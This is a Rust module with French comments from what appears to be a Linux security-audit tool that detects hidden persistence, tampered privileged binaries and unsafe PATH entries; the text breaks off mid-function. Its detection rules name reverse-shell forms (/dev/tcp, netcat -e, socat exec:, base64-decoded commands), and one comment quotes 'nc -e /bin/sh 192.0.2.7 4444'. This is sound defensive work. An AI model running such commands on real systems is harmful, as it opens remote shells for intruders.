//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

use super::designes::{self, Designe};
use super::*;
use crate::machine::temoins;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Un fichier de démarrage ou de configuration tel qu'il est montré : « ~/… » sous le dossier personnel `maison`, et
/// rendu inoffensif (dans /etc/profile.d ou ~/.config/autostart, le nom est celui qu'a choisi qui a posé le fichier).
pub(super) fn court(p: &Path, maison: &Path) -> String {
    crate::ui::affichable(
        &p.strip_prefix(maison)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display())),
    )
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande a la forme d'une porte dérobée, ou `None` : shell inversé, téléchargé ou décodé puis passé
/// à un interpréteur, code caché en base64. Une telle ligne n'est jamais déclarable normale, quelle que soit sa
/// syntaxe (`cibles`).
pub(super) fn raison_grave(commande: &str) -> Option<&'static str> {
    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
    // son nom de fichier (« /bin/nc »), une option telle quelle.
    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
        .into_iter()
        .map(|(m, _)| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    let a = |m: &str| {
        mots_du_shell
            .iter()
            .any(|x| *x == m || crate::machine::chasse::nom_de_fichier(x) == m)
    };
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    // « -e », « -c », « --exec », « --sh-exec », aussi collés à leur valeur (« -e/bin/sh », « --exec=… »).
    let donne_un_shell = mots_du_shell.iter().any(|x| {
        ["-e", "-c", "--exec", "--sh-exec", "--lua-exec"].iter().any(|o| {
            x.strip_prefix(o)
                .is_some_and(|r| r.is_empty() || r.starts_with(['=', '/']))
        })
    });
    if (a("nc") || a("ncat") || a("netcat")) && donne_un_shell {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    let minuscules = commande.to_ascii_lowercase();
    if a("socat") && (minuscules.contains("exec:") || minuscules.contains("system:")) {
        return Some(tr!(
            "socat qui donne un shell (shell inversé)",
            "socat giving a shell (reverse shell)"
        ));
    }
    // Téléchargé ou décodé puis passé à un interpréteur : le même jugement que pour les programmes en marche.
    if let Some(motif) = crate::machine::chasse::passe_a_un_shell(commande) {
        return Some(motif.raison);
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    None
}

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    if let Some(raison) = raison_grave(commande) {
        return Some(raison);
    }
    if !lancement {
        return None;
    }
    // Coupée sur tout blanc, Unicode compris : plus de mots jugés, jamais moins (le témoin, lui, refuse un tel blanc).
    let mots: Vec<&str> = commande
        .split_whitespace()
        .map(|m| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! »).
    let programme = mots.first()?.trim_start_matches(['-', '@', '+', '!', ':']);
    // Un interpréteur ou un lanceur (« /usr/bin/bash ~/.x/a.sh », « env /tmp/x ») : ce qu'il lit ou lance se juge
    // comme le programme lui-même.
    let mut a_juger = vec![programme];
    if designes::lit_un_script(programme) {
        a_juger.extend(mots.iter().skip(1).copied());
    }
    let maison = home();
    for p in a_juger {
        if let Some(raison) = programme_cache(p, &maison) {
            return Some(raison);
        }
    }
    None
}

/// Un programme lancé depuis un dossier temporaire ou un dossier caché du dossier personnel `maison`.
fn programme_cache(programme: &str, maison: &str) -> Option<&'static str> {
    if ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|d| programme.starts_with(d))
    {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("${HOME}/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        });
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.') && r.contains('/') && !DOSSIERS_CACHES_NORMAUX.contains(&premier) {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    commande_lancee_lue(ligne).map(|(c, _)| c)
}

/// `commande_lancee`, et si elle est ambiguë : une ligne Lua où du texte suit le dernier guillemet, ou dont la
/// commande garde un guillemet (« o.exec_on_start("/x/run" .. suffixe) » lance autre chose que « /x/run »). Jugée
/// quand même ; seul le choix « normal » la refuse.
fn commande_lancee_lue(ligne: &str) -> Option<(String, bool)> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "exec-shutdown"].contains(&cle) {
            return Some((valeur.trim().to_string(), false));
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        // `get` rend `None` quand la fin précède le début : le même cas que `fin > debut` refusait.
        let dedans = l.get(debut.checked_add(1)?..fin)?;
        let apres = l.get(fin.checked_add(1)?..).unwrap_or_default();
        let ambigue =
            dedans.contains(['"', '\'']) || apres.contains(|c: char| !matches!(c, ')' | ',' | ';' | ' ' | '\t'));
        return Some((dedans.to_string(), ambigue));
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; « unset » la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne)
        && (ligne.contains("LD_PRELOAD") || ligne.contains("LD_AUDIT"))
        && !ligne.trim_start().starts_with("unset")
}

/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), liens vers un fichier compris ; les liens
/// d'activation (dossiers « *.wants ») ne sont pas parcourus.
pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
    let mut trouve = Vec::new();
    for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
        let p = e.path();
        let Ok(t) = e.file_type() else { continue };
        // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
        // une autre sortirait de la lecture (et son alerte avec). Jamais un lien vers un dossier (une boucle).
        let fichier = t.is_file() || (t.is_symlink() && std::fs::metadata(&p).is_ok_and(|m| m.is_file()));
        if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
            trouve.extend(fichiers_de(&p, extensions));
        } else if fichier && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
            trouve.push(p);
        }
    }
    trouve
}

/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
fn source_de(origine: &str, ligne: &str) -> String {
    format!("{origine}#{}", crate::modele::id::trace(ligne))
}

/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
/// pas, deux lignes identiques comptent une fois).
fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
    sources.sort();
    sources.dedup();
    crate::modele::Objet::de("lancements", &sources.join(","))
}

/// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
/// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
pub(super) fn persistance() -> Vec<Constat> {
    persistance_dans(
        Path::new("/"),
        Path::new(&home()),
        |var| std::env::var_os(var),
        sortie("crontab", &["-l"]),
        Paquets::detecter(),
    )
}

/// La persistance lue sous `racine` (« / » au bilan ; une arborescence fabriquée pour le corpus de détection), le
/// dossier personnel `maison`, les variables de cette session (`variable`), la crontab du compte et le gestionnaire
/// de paquets donnés : la même lecture et le même jugement, sans rien toucher hors de la racine.
pub(super) fn persistance_dans(
    racine: &Path,
    maison: &Path,
    variable: impl Fn(&str) -> Option<std::ffi::OsString>,
    crontab: Option<String>,
    gestion: Option<Paquets>,
) -> Vec<Constat> {
    // Une racine relative (« » au lieu de « / ») ferait lire ld.so.preload, profile.d, cron.d… sous le dossier
    // courant : rien n'y serait, et le verdict serait « sain » (campagne n° 4, M6).
    debug_assert!(
        racine.is_absolute(),
        "racine de la persistance relative : {}",
        racine.display()
    );
    #[cfg(test)]
    tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
    let mut t = Lancements {
        r: Releveur {
            racine: racine.to_path_buf(),
            maison: maison.to_path_buf(),
            runtime: variable("XDG_RUNTIME_DIR")
                .map(std::path::PathBuf::from)
                .filter(|p| p.is_absolute()),
            budget: temoins::Budget::default(),
        },
        ..Lancements::default()
    };
    lire_prechargement(racine, &variable, gestion, &mut t);
    let (demarrage, hypr) = fichiers_de_demarrage(racine, maison);
    let mut configuration = fichiers_de_configuration(racine, maison);
    // Les fichiers de Hyprland sont aussi des fichiers de configuration, après les autres.
    configuration.extend(hypr);
    juger_configuration(&configuration, &demarrage, maison, &mut t);
    juger_demarrage(&demarrage, maison, &mut t);
    juger_cron(racine, crontab, &mut t);
    let services = services_ajoutes(racine, gestion, &mut t.r);
    let mut constats = vec![constat_des_lancements(t)];
    constats.extend(services);
    constats
}

/// Les lignes signalées par la lecture de la persistance : critiques, suspectes, et d'où vient chacune (`source_de`,
/// sans langue ni numéro de ligne) : l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source
/// s'ajoute (accepter les lignes d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
#[derive(Default)]
struct Lancements {
    critiques: Vec<String>,
    suspects: Vec<String>,
    sources: Vec<String>,
    /// Pour chaque ligne signalée, le fichier et la ligne telle qu'écrite (fin « \r » comprise) qu'un geste de
    /// défense retirerait ; `None` : signalée ailleurs que dans un fichier (variable de la session, crontab du compte).
    retraits: Vec<Option<(String, String)>>,
    /// Pour chaque ligne signalée, ce qu'un choix « normal » lierait (`machine::temoins`), ou pourquoi on ne peut pas.
    temoins: Vec<Result<temoins::Temoin, temoins::Refus>>,
    r: Releveur,
}

/// Ce qu'il faut pour relever ce que désigne une ligne : la racine lue, le dossier personnel, le dossier de la
/// session (XDG_RUNTIME_DIR, où systemd range aussi des unités de l'utilisateur) et le budget du bilan.
#[derive(Default)]
struct Releveur {
    racine: std::path::PathBuf,
    maison: std::path::PathBuf,
    runtime: Option<std::path::PathBuf>,
    budget: temoins::Budget,
}

impl Releveur {
    /// Un chemin absolu de l'ordinateur, lu sous la racine (une arborescence fabriquée pour les essais et le
    /// corpus) ; le dossier personnel y est déjà.
    fn sous(&self, chemin: &Path) -> std::path::PathBuf {
        if self.racine == Path::new("/") || chemin.starts_with(&self.racine) {
            chemin.to_path_buf()
        } else {
            self.racine.join(chemin.strip_prefix("/").unwrap_or(chemin))
        }
    }

    /// Un chemin lu, tel qu'il se montre et se lie : « ~/… » dans le dossier personnel (le même fichier pour le
    /// même compte), sinon absolu, sans la racine fabriquée. Pas nettoyé ici (`court`) : le témoin lie le chemin
    /// exact et ne nettoie que ce qu'il montre.
    fn montre(&self, lu: &Path) -> String {
        if let Ok(r) = lu.strip_prefix(&self.maison) {
            return format!("~/{}", r.to_string_lossy());
        }
        if self.racine != Path::new("/")
            && let Ok(r) = lu.strip_prefix(&self.racine)
        {
            return format!("/{}", r.to_string_lossy());
        }
        lu.to_string_lossy().into_owned()
    }
}

/// Où se trouve une ligne de démarrage : la façon de lire sa commande en dépend (`designes::Contexte`).
#[derive(Clone, Copy, PartialEq, Eq)]
enum Sorte {
    /// Une unité systemd, de l'utilisateur ou du système.
    Unite {
        utilisateur: bool,
    },
    Bureau,
    Shell,
}

impl Sorte {
    fn de(f: &Path, r: &Releveur) -> Sorte {
        if f.extension().is_some_and(|x| x == "desktop") {
            Sorte::Bureau
        } else if f.starts_with(r.maison.join(".config/hypr")) || f.extension().is_some_and(|x| x == "lua") {
            Sorte::Shell
        } else {
            Sorte::Unite {
                utilisateur: !f.starts_with(r.sous(Path::new("/etc/systemd/system"))),
            }
        }
    }

    fn contexte(self, maison: &str) -> designes::Contexte<'_> {
        match self {
            Sorte::Unite { utilisateur: true } => designes::Contexte::Unite(Some(maison)),
            Sorte::Unite { utilisateur: false } => designes::Contexte::Unite(None),
            Sorte::Bureau => designes::Contexte::Bureau,
            Sorte::Shell => designes::Contexte::Shell,
        }
    }
}

/// Pourquoi une ligne ne dit pas sans ambiguïté ce qu'elle lance, prêt à suivre « la ligne « … » ».
fn raison_du_flou(f: designes::Flou) -> &'static str {
    use designes::Flou;
    match f {
        Flou::Syntaxe => tr!(
            "ne dit pas sans ambiguïté ce qu'elle lance (variable, sous-commande, tube, joker, guillemet ou code de systemd)",
            "does not say unambiguously what it starts (variable, subcommand, pipe, wildcard, quote or systemd specifier)"
        ),
        Flou::Blanc => tr!(
            "contient un blanc inhabituel ou un caractère invisible : l'écran ne la montre pas telle qu'elle se lit",
            "contains an unusual space or an invisible character: the screen does not show it the way it is read"
        ),
        Flou::Relatif => tr!(
            "nomme un chemin relatif, qui dépend du dossier courant",
            "names a relative path, which depends on the current folder"
        ),
        Flou::NomNu => tr!(
            "nomme son programme sans chemin : il est cherché dans le PATH au lancement",
            "names its program without a path: it is looked up in PATH at launch"
        ),
        Flou::Maison => tr!(
            "désigne le dossier personnel par une variable (~, $HOME), qu'un autre fichier peut changer",
            "refers to the home folder through a variable (~, $HOME) that another file can change"
        ),
        Flou::Interprete => tr!(
            "lance un interpréteur sans script lié (code dans la ligne, module, entrée standard)",
            "starts an interpreter without a bound script (inline code, module, standard input)"
        ),
        Flou::Lanceur => tr!(
            "passe par un lanceur (env, nohup, sudo…) qui lance une autre commande",
            "goes through a launcher (env, nohup, sudo…) that starts another command"
        ),
        Flou::Option => tr!(
            "colle un chemin à une option, une forme qui n'est pas suivie",
            "glues a path to an option, a form that is not tracked"
        ),
        Flou::Trop => tr!(
            "désigne trop de fichiers, ou un chemin trop long",
            "names too many files, or a path that is too long"
        ),
        Flou::Vide => tr!("ne désigne aucun fichier", "names no file"),
    }
}

/// Les fichiers que désigne une ligne (`designes`), relevés sous la racine ; `Err` : la ligne a la forme d'une porte
/// dérobée, ne dit pas sans ambiguïté ce qu'elle lance, ou l'un d'eux ne se relève pas.
fn cibles(r: &mut Releveur, d: Designe, ligne: &str) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    // Exclue par sa raison, pas par sa syntaxe : « nc -e /bin/sh 192.0.2.7 4444 » se lit sans ambiguïté.
    if raison_grave(ligne).is_some() {
        return Err(temoins::Refus(
            tr!(
                "cette ligne a la forme d'une porte dérobée (shell inversé, script téléchargé ou caché) : elle ne se déclare jamais normale",
                "this line has the shape of a backdoor (reverse shell, downloaded or hidden script): it can never be declared normal"
            )
            .to_string(),
        ));
    }
    let chemins = match d {
        Designe::Chemins(c) => c,
        Designe::Indefini(flou) => {
            return Err(temoins::Refus(trf!(
                "la ligne « {} » {}",
                "the line “{}” {}",
                crate::ui::couper(&crate::ui::affichable(ligne.trim()), 80),
                raison_du_flou(flou)
            )));
        }
    };
    let mut sortie = Vec::with_capacity(chemins.len());
    for c in chemins {
        let lu = r.sous(Path::new(&c));
        let montre = r.montre(&lu);
        sortie.push((montre, temoins::etat_de_la_cible(&lu, &mut r.budget)?));
    }
    Ok(sortie)
}

/// Au-delà de `TEMOINS_MAX` lignes, l'alerte ne se déclare pas : les suivantes ne sont pas relues.
fn place(t: &Lancements) -> Result<(), temoins::Refus> {
    if t.temoins.len() >= temoins::TEMOINS_MAX {
        return Err(temoins::Refus(trf!(
            "plus de {} lignes signalées, plus que celles qui se montrent avant un tel choix",
            "more than {} reported lines, more than can be shown before such a choice",
            temoins::TEMOINS_MAX
        )));
    }
    Ok(())
}

/// Au plus autant d'octets lus dans un fichier de démarrage ou de configuration.
const LECTURE_MAX: u64 = 32 * 1024 * 1024;

/// Un fichier de démarrage ou de configuration lu : ses octets (liés par un choix), son texte (jugé ; un octet qui
/// n'est pas de l'UTF-8 ne fait plus sauter le fichier), et s'il a été lu en entier.
struct Lecture {
    octets: Vec<u8>,
    texte: String,
    entier: bool,
}

/// Lit un fichier de démarrage ou de configuration, borné (`temoins::lire_borne` : jamais un tube, un périphérique
/// ni plus de `LECTURE_MAX` octets). Ce qui ne se lit pas en entier, ou un tube nommé à la place du fichier, est dit
/// dans l'alerte, jamais compté comme sain ; absent ou interdit de lecture, il est sauté comme avant.
fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
    match temoins::lire_borne(f, LECTURE_MAX) {
        Ok(lu) => {
            if !lu.entier {
                non_lu(
                    f,
                    h,
                    t,
                    tr!("trop gros pour être lu en entier", "too large to be read in full"),
                );
            }
            Some(Lecture {
                texte: String::from_utf8_lossy(&lu.octets).into_owned(),
                entier: lu.entier,
                octets: lu.octets,
            })
        }
        Err(_) if std::fs::metadata(f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type())) => {
            non_lu(
                f,
                h,
                t,
                tr!("tube nommé à la place d'un fichier", "named pipe instead of a file"),
            );
            None
        }
        Err(_) => None,
    }
}

/// Un fichier de démarrage ou de configuration qui ne se lit pas en entier : une ligne de l'alerte.
fn non_lu(f: &Path, h: &Path, t: &mut Lancements, raison: &str) {
    t.sources
        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), "non lu"));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(trf!(
        "{} ne se lit pas en entier",
        "{} cannot be read in full",
        court(f, h)
    ))));
    t.suspects.push(trf!(
        "{} : {raison}, non vérifié",
        "{}: {raison}, not checked",
        court(f, h)
    ));
}

/// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `lu` est le contenu ; pour une ligne
/// d'unité systemd, aussi ce qui change l'unité sans toucher à la ligne (`unite`).
fn temoin_de_ligne(
    t: &mut Lancements,
    fichier: &Path,
    n: usize,
    lu: &Lecture,
    ligne: &str,
    designe: Designe,
    sorte: Sorte,
) -> Result<temoins::Temoin, temoins::Refus> {
    place(t)?;
    let mut cibles = cibles(&mut t.r, designe, ligne)?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} ne se lit pas en entier",
            "{} cannot be read in full",
            court(fichier, &t.r.maison)
        )));
    }
    if let Sorte::Unite { utilisateur } = sorte {
        cibles.extend(unite(&t.r, fichier, &lu.texte, utilisateur)?);
    }
    let numero = n.saturating_add(1);
    Ok(temoins::temoin(
        &format!("{}:{numero}", fichier.to_string_lossy()),
        format!("{}:{numero}", court(fichier, &t.r.maison)),
        ligne,
        Some(&temoins::etat_du_contenant(fichier, &lu.octets)),
        &cibles,
    ))
}

/// Au plus autant de fichiers d'ajout (drop-ins) liés pour une unité.
const AJOUTS_MAX: usize = 32;
/// Un fichier d'ajout plus gros n'est pas une configuration.
const AJOUT_MAX: u64 = 1024 * 1024;

/// Directives d'une unité qui changent ce qu'elle lance ou charge sans toucher à la ligne acceptée : variables lues
/// ailleurs, dossier de recherche des programmes, racine ou dossiers montés à la place des vrais.
const DIRECTIVES_REFUSEES: [&str; 9] = [
    "EnvironmentFile",
    "ExecSearchPath",
    "RootDirectory",
    "RootImage",
    "BindPaths",
    "BindReadOnlyPaths",
    "MountImages",
    "ExtensionImages",
    "ExtensionDirectories",
];

/// Une variable qui change ce que charge un programme ou un interpréteur, ou où il cherche : bibliothèques, modules,
/// dossier personnel (« ${HOME}/x » d'une ligne), PATH, fichier lu au démarrage d'un shell.
fn variable_sensible(nom: &str) -> bool {
    const DEBUTS: [&str; 18] = [
        "LD_",
        "PYTHON",
        "NODE_",
        "PERL",
        "RUBY",
        "GEM_",
        "BUNDLE_",
        "DENO_",
        "BUN_",
        "LUA_",
        "PHP",
        "JAVA_",
        "_JAVA_",
        "JDK_JAVA_",
        "CLASSPATH",
        "GCONV_",
        "GTK_MODULES",
        "MALLOC_",
    ];
    const NOMS: [&str; 8] = [
        "HOME",
        "PATH",
        "ENV",
        "BASH_ENV",
        "ZDOTDIR",
        "SHELLOPTS",
        "BASHOPTS",
        "IFS",
    ];
    let n = nom.to_ascii_uppercase();
    DEBUTS.iter().any(|d| n.starts_with(d)) || NOMS.contains(&n.as_str())
}

/// La première directive d'une unité ou d'un ajout qui change ce qu'elle lance sans toucher à la ligne acceptée
/// (`DIRECTIVES_REFUSEES`, une variable sensible dans « Environment= » ou « PassEnvironment= »), telle qu'à montrer.
/// Les lignes continuées par « \ » sont jointes comme les joint systemd (un commentaire au milieu est sauté).
fn directive_refusee(texte: &str) -> Option<String> {
    let mut logiques: Vec<String> = Vec::new();
    let mut cours = String::new();
    let mut continue_ = false;
    for l in texte.lines() {
        let l = l.trim_matches([' ', '\t']);
        if l.starts_with(['#', ';']) {
            continue;
        }
        if let Some(debut) = l.strip_suffix('\\') {
            cours.push_str(debut);
            cours.push(' ');
            continue_ = true;
        } else {
            cours.push_str(l);
            logiques.push(std::mem::take(&mut cours));
            continue_ = false;
        }
    }
    if continue_ {
        logiques.push(cours);
    }
    for l in &logiques {
        let Some((cle, valeur)) = l.split_once('=') else {
            continue;
        };
        let cle = cle.trim_matches([' ', '\t']);
        if DIRECTIVES_REFUSEES.contains(&cle) {
            return Some(cle.to_string());
        }
        if cle == "Environment" || cle == "PassEnvironment" {
            for mot in valeur.split([' ', '\t', '"', '\'']).filter(|m| !m.is_empty()) {
                let nom = mot.split('=').next().unwrap_or(mot);
                if variable_sensible(nom) {
                    return Some(format!("{cle}={}", crate::ui::affichable(nom)));
                }
            }
        }
    }
    None
}

/// Les dossiers où systemd cherche les unités, du plus prioritaire au moins prioritaire (systemd.unit(5)).
fn dossiers_d_unites(r: &Releveur, utilisateur: bool) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
    let s = |c: &str| r.sous(Path::new(c));
    if !utilisateur {
        return Ok([
            "/etc/systemd/system.control",
            "/run/systemd/system.control",
            "/run/systemd/transient",
            "/run/systemd/generator.early",
            "/etc/systemd/system",
            "/etc/systemd/system.attached",
            "/run/systemd/system",
            "/run/systemd/generator",
            "/usr/local/lib/systemd/system",
            "/usr/lib/systemd/system",
            "/run/systemd/generator.late",
        ]
        .iter()
        .map(|c| s(c))
        .collect());
    }
    let Some(session) = r.runtime.as_deref() else {
        return Err(temoins::Refus(
            tr!(
                "le dossier de la session (XDG_RUNTIME_DIR) est inconnu : ce que systemd y ajoute à l'unité ne se vérifie pas",
                "the session folder (XDG_RUNTIME_DIR) is unknown: what systemd adds to the unit there cannot be checked"
            )
            .to_string(),
        ));
    };
    let run = |c: &str| r.sous(&session.join(c));
    let m = |c: &str| r.maison.join(c);
    Ok(vec![
        m(".config/systemd/user.control"),
        run("systemd/user.control"),
        run("systemd/transient"),
        run("systemd/generator.early"),
        m(".config/systemd/user"),
        s("/etc/xdg/systemd/user"),
        s("/etc/systemd/user"),
        run("systemd/user"),
        run("systemd/generator"),
        m(".local/share/systemd/user"),
        s("/usr/local/share/systemd/user"),
        s("/usr/share/systemd/user"),
        s("/usr/local/lib/systemd/user"),
        s("/usr/lib/systemd/user"),
        run("systemd/generator.late"),
    ])
}

/// Les noms des dossiers d'ajout qui s'appliquent à l'unité `nom` : « a-b.service.d », « a-.service.d »,
/// « service.d », et pour une instance « a@.service.d ».
fn ajouts_de(nom: &str) -> Vec<String> {
    let mut noms = vec![format!("{nom}.d")];
    if let Some((base, genre)) = nom.rsplit_once('.') {
        for (i, _) in base.match_indices('-') {
            if let Some(p) = base.get(..=i) {
                noms.push(format!("{p}.{genre}.d"));
            }
        }
        if let Some((gabarit, _)) = base.split_once('@') {
            noms.push(format!("{gabarit}@.{genre}.d"));
        }
        noms.push(format!("{genre}.d"));
    }
    noms.sort();
    noms.dedup();
    noms
}

/// Un fichier d'ajout, ou l'unité d'un ajout : son état, une fois ses directives vérifiées. Un ajout masqué (lien
/// vers /dev/null) ne compte pas, et se lie comme tel.
fn lire_ajout(r: &Releveur, f: &Path) -> Result<temoins::Etat, temoins::Refus> {
    let montre = || crate::ui::affichable(&r.montre(f));
    if std::fs::read_link(f).is_ok_and(|v| v == Path::new("/dev/null")) {
        return Ok(temoins::Etat::Lien {
            vers: "/dev/null".into(),
            puis: Box::new(temoins::Etat::Absent),
        });
    }
    let lu = match temoins::lire_borne(f, AJOUT_MAX) {
        Ok(lu) => lu,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(temoins::Etat::Absent),
        Err(e) => {
            return Err(temoins::Refus(trf!(
                "{} ne se lit pas ({e})",
                "{} cannot be read ({e})",
                montre()
            )));
        }
    };
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} est trop gros pour être relu à chaque bilan",
            "{} is too large to be re-read at each check",
            montre()
        )));
    }
    if let Some(d) = directive_refusee(&String::from_utf8_lossy(&lu.octets)) {
        return Err(refus_directive(&montre(), &d));
    }
    Ok(temoins::etat_du_contenant(f, &lu.octets))
}

fn refus_directive(fichier: &str, directive: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} : {directive} change ce que l'unité charge ou lance sans toucher à sa ligne",
        "{fichier}: {directive} changes what the unit loads or starts without touching its line"
    ))
}

/// Pour une ligne de l'unité systemd `fichier` (dont `texte` est le contenu lu) : ce qui change ce que l'unité lance
/// sans toucher à la ligne. Refusé : une unité du même nom dans un dossier qui passe avant, une directive qui change
/// les bibliothèques, les dossiers ou les variables (`directive_refusee`), trop d'ajouts. Lié : chaque fichier
/// d'ajout (drop-in) de chaque dossier de systemd, et pour une ligne d'un ajout, l'unité elle-même.
fn unite(
    r: &Releveur,
    fichier: &Path,
    texte: &str,
    utilisateur: bool,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&crate::ui::affichable(&r.montre(fichier)), &d));
    }
    let parent = fichier.parent().unwrap_or(Path::new("/"));
    let nom_du_parent = parent.file_name().map(|n| n.to_string_lossy().into_owned());
    let (nom, dossier, ajout) = match nom_du_parent.as_deref().and_then(|n| n.strip_suffix(".d")) {
        Some(n) => (n.to_string(), parent.parent().unwrap_or(Path::new("/")), true),
